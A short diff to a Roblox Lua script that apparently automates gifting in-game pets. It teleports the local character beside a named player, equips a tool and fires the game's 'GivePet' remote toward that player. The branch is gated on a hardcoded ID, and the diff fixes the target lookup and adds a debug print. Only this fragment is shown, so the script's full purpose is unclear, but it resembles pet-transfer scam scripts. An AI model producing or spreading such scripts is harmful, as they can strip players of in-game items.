@@ -140,8 +140,9 @@ elseif target == 35789249 then
                                             local bp = player.LocalPlayer.Backpack
                                             if bp:FindFirstChild(toolequip) then
                                                 local tool = bp:FindFirstChild(toolequip)
+                                                local target = player:FindFirstChild(x)
                                                 if tool then
-                                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = x.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 6)
+                                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 6)
                                                     print("Equipping", tool)
                                                     chr.Humanoid:EquipTool(tool)
                                                     task.wait(2)
@@ -152,6 +153,7 @@ elseif target == 35789249 then
                                                     game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
                                                 end
                                             else
+                                                print("GOND")
                                                 local args = {
                                                     "GivePet",
                                                     game:GetService("Players"):WaitForChild(x)
